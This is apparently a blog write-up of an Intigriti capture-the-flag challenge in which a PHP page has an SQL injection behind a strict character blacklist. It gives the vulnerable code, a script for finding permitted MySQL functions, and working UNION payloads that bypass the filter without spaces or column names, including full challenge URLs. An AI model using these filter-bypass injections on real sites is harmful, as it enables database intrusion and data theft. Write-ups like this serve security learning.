---
layout: post
category: writeups
---

This week while I was on Twitter, I noticed that the new intigriti challenge had come out. I decided to give it a try and see if I could solve it.

# Code Analysis

The challenge didn't have many functions so it was immediately clear where the vulnerability was and what to do to exploit it.

Briefly, the site consisted of a single page in php, which returned the data of the site's users.The backend code was accessible.


By analyzing the source code, you can immediately notice that there is a SQL Injection in the `max` parameter of the GET Request. The only problem is that there is a very strong blacklist in the code, which prohibits many things.

```
$max = 10;

if (isset($_GET['max']) && !is_array($_GET['max']) && $_GET['max']>0) {
    $max = $_GET['max'];
    $words  = ["'","\"",";","`"," ","a","b","h","k","p","v","x","or","if","case","in","between","join","json","set","=","|","&","%","+","-","<",">","#","/","\r","\n","\t","\v","\f"]; // list of characters to check
    foreach ($words as $w) {
        if (preg_match("#".preg_quote($w)."#i", $max)) {
            exit("H4ckerzzzz");
        } //no weird chars
    }       
}

try{
//seen in production
$stmt = $pdo->prepare("SELECT id, name, email FROM users WHERE id<=$max");
$stmt->execute();
$results = $stmt->fetchAll();
}
catch(\PDOException $e){
    exit("ERROR: BROKEN QUERY");
}
```

Furthermore, by continuing to read the code we can find also this:

```
        <tbody>
            <?php foreach ($results as $row): ?>
                <tr>
                    <td><?= htmlspecialchars(strpos($row['id'],"INTIGRITI")===false?$row['id']:"REDACTED"); ?></td> 
                    <td><?= htmlspecialchars(strpos($row['name'],"INTIGRITI")===false?$row['name']:"REDACTED"); ?></td>
                    <td><?= htmlspecialchars(strpos($row['email'],"INTIGRITI")===false?$row['email']:"REDACTED"); ?></td>
                </tr>
            <?php endforeach; ?>
        </tbody> 
```

As we can see, if  the query returns the substring `INTIGRITI` in one of the columns of the table such as `id`, `email` or `username`, the actual contents of that value will be hidden and the word REDACTED will be displayed in the response.

We know from the challenge rules that this month's flag follows this format: `The flag format is INTIGRITI{.*}.`

In the case through SQL Injection we will be able to see the word `REDACTED` in one of the rows, then it means that the flag will probably be present there and we will need a gadget to change or remove the `INTIGRITI` substring, so as to bypass `strpos` and extract the true content present in the DB.

Furthermore, paying attention to the query, we can notice that the query probably does not return all the values present in the `users` table:

`$stmt = $pdo->prepare("SELECT id, name, email FROM users WHERE id<=$max");`

If the creator of the site wanted to return all the columns he would have written the query:

`$stmt = $pdo->prepare("SELECT * FROM users WHERE id<=$max");`

We can assume that perhaps there is at least one other column in the users table (probably password), which contains the flag in one of the users.

# Finding stuffs to obtain the flag

Now that we've done an analysis of the source code, we need a few things:
1. Write a valid query without spaces.
2. Find gadgets that can be useful to extract data.
3. Find a way to bypass prohibited characters and words (if it exists)
4. If we don't find anything for the third option we need to find a way to call columns/tables without writing their name (in case they have banned values)

The first thing I thought of doing was to write a code that, given a list of SQL functions, checks which are usable and which are not.

```
<html>
<body>
<?php


$combination = ['&','>','>>','>=','<','<>','!=','<<','<=','<=>','%','MOD','*','+','-','-','->','->>','/',':=','=','SET','SET','UPDATE','=','^','ABS()','ACOS()','ADDDATE()','ADDTIME()','AES_DECRYPT()','AES_ENCRYPT()','AND','&&','ANY_VALUE()','ASCII()','ASIN()','asynchronous_connection_failover_add_managed()','asynchronous_connection_failover_add_source()','asynchronous_connection_failover_delete_managed()','asynchronous_connection_failover_delete_source()','asynchronous_connection_failover_reset()','ATAN()','ATAN2()','ATAN()','AVG()','BENCHMARK()','BETWEEN ... AND ...','BIN()','BIN_TO_UUID()','BINARY','BIT_AND()','BIT_COUNT()','BIT_LENGTH()','BIT_OR()','BIT_XOR()','CAN_ACCESS_COLUMN()','CAN_ACCESS_DATABASE()','CAN_ACCESS_TABLE()','CAN_ACCESS_USER()','CAN_ACCESS_VIEW()','CASE','CAST()','CEIL()','CEILING()','CHAR()','CHAR_LENGTH()','CHARACTER_LENGTH()','CHARSET()','COALESCE()','COERCIBILITY()','COLLATION()','COMPRESS()','CONCAT()','CONCAT_WS()','CONNECTION_ID()','CONV()','CONVERT()','CONVERT_TZ()','COS()','COT()','COUNT()','COUNT(DISTINCT)','CRC32()','CUME_DIST()','CURDATE()','CURRENT_DATE()','CURRENT_DATE','CURRENT_ROLE()','CURRENT_TIME()','CURRENT_TIME','CURRENT_TIMESTAMP()','CURRENT_TIMESTAMP','CURRENT_USER()','CURRENT_USER','CURTIME()','DATABASE()','DATE()','DATE_ADD()','DATE_FORMAT()','DATE_SUB()','DATEDIFF()','DAY()','DAYNAME()','DAYOFMONTH()','DAYOFWEEK()','DAYOFYEAR()','DEFAULT()','DEGREES()','DENSE_RANK()','DIV','ELT()','EXP()','EXPORT_SET()','EXTRACT()','ExtractValue()','FIELD()','FIND_IN_SET()','FIRST_VALUE()','FLOOR()','FORMAT()','FORMAT_BYTES()','FORMAT_PICO_TIME()','FOUND_ROWS()','FROM_BASE64()','FROM_DAYS()','FROM_UNIXTIME()','GeomCollection()','GeometryCollection()','GET_DD_COLUMN_PRIVILEGES()','GET_DD_CREATE_OPTIONS()','GET_DD_INDEX_SUB_PART_LENGTH()','GET_FORMAT()','GET_LOCK()','GREATEST()','GROUP_CONCAT()','group_replication_disable_member_action()','group_replication_enable_member_action()','group_replication_get_communication_protocol()','group_replication_get_write_concurrency()','group_replication_reset_member_actions()','group_replication_set_as_primary()','group_replication_set_communication_protocol()','group_replication_set_write_concurrency()','group_replication_switch_to_multi_primary_mode()','group_replication_switch_to_single_primary_mode()','GROUPING()','GTID_SUBSET()','GTID_SUBTRACT()','HEX()','HOUR()','ICU_VERSION()','IF()','IFNULL()','IN()','INET_ATON()','INET_NTOA()','INET6_ATON()','INET6_NTOA()','INSERT()','INSTR()','INTERNAL_AUTO_INCREMENT()','INTERNAL_AVG_ROW_LENGTH()','INTERNAL_CHECK_TIME()','INTERNAL_CHECKSUM()','INTERNAL_DATA_FREE()','INTERNAL_DATA_LENGTH()','INTERNAL_DD_CHAR_LENGTH()','INTERNAL_GET_COMMENT_OR_ERROR()','INTERNAL_GET_ENABLED_ROLE_JSON()','INTERNAL_GET_HOSTNAME()','INTERNAL_GET_USERNAME()','INTERNAL_GET_VIEW_WARNING_OR_ERROR()','INTERNAL_INDEX_COLUMN_CARDINALITY()','INTERNAL_INDEX_LENGTH()','INTERNAL_IS_ENABLED_ROLE()','INTERNAL_IS_MANDATORY_ROLE()','INTERNAL_KEYS_DISABLED()','INTERNAL_MAX_DATA_LENGTH()','INTERNAL_TABLE_ROWS()','INTERNAL_UPDATE_TIME()','INTERVAL()','IS','IS_FREE_LOCK()','IS_IPV4()','IS_IPV4_COMPAT()','IS_IPV4_MAPPED()','IS_IPV6()','IS NOT','IS NOT NULL','IS NULL','IS_USED_LOCK()','IS_UUID()','ISNULL()','JSON_ARRAY()','JSON_ARRAY_APPEND()','JSON_ARRAY_INSERT()','JSON_ARRAYAGG()','JSON_CONTAINS()','JSON_CONTAINS_PATH()','JSON_DEPTH()','JSON_EXTRACT()','JSON_INSERT()','JSON_KEYS()','JSON_LENGTH()','JSON_MERGE()','JSON_MERGE_PATCH()','JSON_MERGE_PRESERVE()','JSON_OBJECT()','JSON_OBJECTAGG()','JSON_OVERLAPS()','JSON_PRETTY()','JSON_QUOTE()','JSON_REMOVE()','JSON_REPLACE()','JSON_SCHEMA_VALID()','JSON_SCHEMA_VALIDATION_REPORT()','JSON_SEARCH()','JSON_SET()','JSON_STORAGE_FREE()','JSON_STORAGE_SIZE()','JSON_TABLE()','JSON_TYPE()','JSON_UNQUOTE()','JSON_VALID()','JSON_VALUE()','LAG()','LAST_DAY','LAST_INSERT_ID()','LAST_VALUE()','LCASE()','LEAD()','LEAST()','LEFT()','LENGTH()','LIKE','LineString()','LN()','LOAD_FILE()','LOCALTIME()','LOCALTIME','LOCALTIMESTAMP','LOCALTIMESTAMP()','LOCATE()','LOG()','LOG10()','LOG2()','LOWER()','LPAD()','LTRIM()','MAKE_SET()','MAKEDATE()','MAKETIME()','MASTER_POS_WAIT()','MATCH()','MAX()','MBRContains()','MBRCoveredBy()','MBRCovers()','MBRDisjoint()','MBREquals()','MBRIntersects()','MBROverlaps()','MBRTouches()','MBRWithin()','MD5()','MEMBER OF()','MICROSECOND()','MID()','MIN()','MINUTE()','MOD()','MONTH()','MONTHNAME()','MultiLineString()','MultiPoint()','MultiPolygon()','NAME_CONST()','NOT','!','NOT BETWEEN ... AND ...','NOT IN()','NOT LIKE','NOT REGEXP','NOW()','NTH_VALUE()','NTILE()','NULLIF()','OCT()','OCTET_LENGTH()','OR','||','ORD()','PERCENT_RANK()','PERIOD_ADD()','PERIOD_DIFF()','PI()','Point()','Polygon()','POSITION()','POW()','POWER()','PS_CURRENT_THREAD_ID()','PS_THREAD_ID()','QUARTER()','QUOTE()','RADIANS()','RAND()','RANDOM_BYTES()','RANK()','REGEXP','REGEXP_INSTR()','REGEXP_LIKE()','REGEXP_REPLACE()','REGEXP_SUBSTR()','RELEASE_ALL_LOCKS()','RELEASE_LOCK()','REPEAT()','REPLACE()','REVERSE()','RIGHT()','RLIKE','ROLES_GRAPHML()','ROUND()','ROW_COUNT()','ROW_NUMBER()','RPAD()','RTRIM()','SCHEMA()','SEC_TO_TIME()','SECOND()','SESSION_USER()','SHA1()','SHA()','SHA2()','SIGN()','SIN()','SLEEP()','SOUNDEX()','SOUNDS LIKE','SOURCE_POS_WAIT()','SPACE()','SQRT()','ST_Area()','ST_AsBinary()','ST_AsWKB()','ST_AsGeoJSON()','ST_AsText()','ST_AsWKT()','ST_Buffer()','ST_Buffer_Strategy()','ST_Centroid()','ST_Collect()','ST_Contains()','ST_ConvexHull()','ST_Crosses()','ST_Difference()','ST_Dimension()','ST_Disjoint()','ST_Distance()','ST_Distance_Sphere()','ST_EndPoint()','ST_Envelope()','ST_Equals()','ST_ExteriorRing()','ST_FrechetDistance()','ST_GeoHash()','ST_GeomCollFromText()','ST_GeometryCollectionFromText()','ST_GeomCollFromTxt()','ST_GeomCollFromWKB()','ST_GeometryCollectionFromWKB()','ST_GeometryN()','ST_GeometryType()','ST_GeomFromGeoJSON()','ST_GeomFromText()','ST_GeometryFromText()','ST_GeomFromWKB()','ST_GeometryFromWKB()','ST_HausdorffDistance()','ST_InteriorRingN()','ST_Intersection()','ST_Intersects()','ST_IsClosed()','ST_IsEmpty()','ST_IsSimple()','ST_IsValid()','ST_LatFromGeoHash()','ST_Latitude()','ST_Length()','ST_LineFromText()','ST_LineStringFromText()','ST_LineFromWKB()','ST_LineStringFromWKB()','ST_LineInterpolatePoint()','ST_LineInterpolatePoints()','ST_LongFromGeoHash()','ST_Longitude()','ST_MakeEnvelope()','ST_MLineFromText()','ST_MultiLineStringFromText()','ST_MLineFromWKB()','ST_MultiLineStringFromWKB()','ST_MPointFromText()','ST_MultiPointFromText()','ST_MPointFromWKB()','ST_MultiPointFromWKB()','ST_MPolyFromText()','ST_MultiPolygonFromText()','ST_MPolyFromWKB()','ST_MultiPolygonFromWKB()','ST_NumGeometries()','ST_NumInteriorRing()','ST_NumInteriorRings()','ST_NumPoints()','ST_Overlaps()','ST_PointAtDistance()','ST_PointFromGeoHash()','ST_PointFromText()','ST_PointFromWKB()','ST_PointN()','ST_PolyFromText()','ST_PolygonFromText()','ST_PolyFromWKB()','ST_PolygonFromWKB()','ST_Simplify()','ST_SRID()','ST_StartPoint()','ST_SwapXY()','ST_SymDifference()','ST_Touches()','ST_Transform()','ST_Union()','ST_Validate()','ST_Within()','ST_X()','ST_Y()','STATEMENT_DIGEST()','STATEMENT_DIGEST_TEXT()','STD()','STDDEV()','STDDEV_POP()','STDDEV_SAMP()','STR_TO_DATE()','STRCMP()','SUBDATE()','SUBSTR()','SUBSTRING()','SUBSTRING_INDEX()','SUBTIME()','SUM()','SYSDATE()','SYSTEM_USER()','TAN()','TIME()','TIME_FORMAT()','TIME_TO_SEC()','TIMEDIFF()','TIMESTAMP()','TIMESTAMPADD()','TIMESTAMPDIFF()','TO_BASE64()','TO_DAYS()','TO_SECONDS()','TRIM()','TRUNCATE()','UCASE()','UNCOMPRESS()','UNCOMPRESSED_LENGTH()','UNHEX()','UNIX_TIMESTAMP()','UpdateXML()','UPPER()','USER()','UTC_DATE()','UTC_TIME()','UTC_TIMESTAMP()','UUID()','UUID_SHORT()','UUID_TO_BIN()','VALIDATE_PASSWORD_STRENGTH()','VALUES()','VAR_POP()','VAR_SAMP()','VARIANCE()','VERSION()','WAIT_FOR_EXECUTED_GTID_SET()','WAIT_UNTIL_SQL_THREAD_AFTER_GTIDS()','WAIT_FOR_EXECUTED_GTID_SET()','WEEK()','WEEKDAY()','WEEKOFYEAR()','WEIGHT_STRING()','XOR','YEAR()','YEARWEEK()','|','~'];

$max = $_GET['max'];
$words  = ["'","\"",";","`"," ","a","b","h","k","p","v","x","or","if","case","in","between","join","json","set","=","|","&","%","+","-","<",">","#","/","\r","\n","\t","\v","\f"]; // list of characters to check
foreach ($combination as $c){
  $ok = True; 
  foreach ($words as $w) {
        if (preg_match("#".preg_quote($w)."#i", $c)) { 
          $ok=False;
        }
    }
  if($ok){
    echo "<h1>".$c."</h1>";
  }
}
echo $max;

?>
</body>
</html>

```

You can run this code saving it in a file like `index.php`and running in the same path a php local server:
`php -S 127.0.0.1:1337`

Now that we've found some functions that can be useful to us, it's time to find a way to write queries without spaces.
Many of the bypasses on the internet will not work due to the blacklist.

Googling the phrase `very strict sql injection space bypass` (lol) will show up in one of the results this very useful writeup:

https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/

In the article there is this payload which using parentheses (Parentheses are not in our blacklist, so we can use them) allows us to write queries without spaces and bypass the blacklist (Obviously the query in question does not work with our challenge as many characters and functions are banned):

`(1)and(1)=(0)union(select(null),table_name,(null)from(information_schema.tables)limit 28,1--`

It's time to write a valid query for our challenge:

`1^(1)union(select(1),2,(3)from(users))`

Now that we have a valid query, we need to find a way to extract for example the fourth column bypassing the blacklist (could be `password`, `pass` or other).

Since the letter `a` is blocked by the blacklist, and we know from the query that the `name` column exists, we will work on this query to try to find a bypass.

`1^(1)union(select(1),name,(3)from(users))`

Initially I thought it was possible to bypass the query using for example a `Homoglyphs attack`. After many hours wasted looking for a bypass I realized that trying to bypass the blacklist was not feasible. So I started looking for a way to name columns by renaming them with allowed characters.


# Bypass Column Names Restriction

After a bit of research, I found this on hacktrick:

*It’s possible to access the third column of a table without using its name using a query like the following: SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;, so in an sqlinjection this would looks like:*

and the payload was:

```
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```

Now that we have a way to call columns we don't know about by renaming them with characters allowed by the blacklist, all we have to do is forge our payload (doing a lot of localhost testing first to make sure what we write will work).

The first payload created that worked was:
`1^(1)UNION(SELECT(F.2),F.3,(F.4)FROM(SELECT(1),2,3,(4)UNION(SELECT*FROM(users)))F)`

Using this payload, we were able to return the word `REDACTED` for the user `Sgrum0x`. It means that the flag is present in the fourth column of that user. It's almost time to find the flag!

# Solution

To find the flag, we need to remove the word `INTIGRITI`, or one of its letters, from the result of that value, so that this code in the backend does not hide the flag with the word `REDACTED` in the response:

```
<td><?= htmlspecialchars(strpos($row['id'],"INTIGRITI")===false?$row['id']:"REDACTED"); ?></td> 
<td><?= htmlspecialchars(strpos($row['name'],"INTIGRITI")===false?$row['name']:"REDACTED"); ?></td>
<td><?= htmlspecialchars(strpos($row['email'],"INTIGRITI")===false?$row['email']:"REDACTED"); ?></td>
```

We need our list of gadgets to find a useful one.

The first one I found to solve the challenge was `LOWER()`. Thanks to the lower command I was able to make the word intrigriti lowercase and return the contents of the column :)

Payload:  `1^(1)UNION(SELECT(F.2),(F.3),(lower(F.4))FROM(SELECT(1),2,3,(4)UNION(SELECT*FROM(users)))F)`

https://challenge-0923.intigriti.io/challenge.php?max=1^(1)UNION(SELECT(F.2),(F.3),(lower(F.4))FROM(SELECT(1),2,3,(4)UNION(SELECT*FROM(users)))F)

another useful command found was mid(). Mid is an alternative to substr() and thanks to this command it was possible to remove the word INTIGRITI.

Payload2: `1^(1)UNION(SELECT(F.2),(F.3),(mid(F.4,10,90))FROM(SELECT(1),2,3,(4)UNION(SELECT*FROM(users)))F)`

https://challenge-0923.intigriti.io/challenge.php?max=1^(1)UNION(SELECT(F.2),(F.3),(mid(F.4,10,90))FROM(SELECT(1),2,3,(4)UNION(SELECT*FROM(users)))F)

it's likely there are other ways to extract the flag, you just need to have fun :)
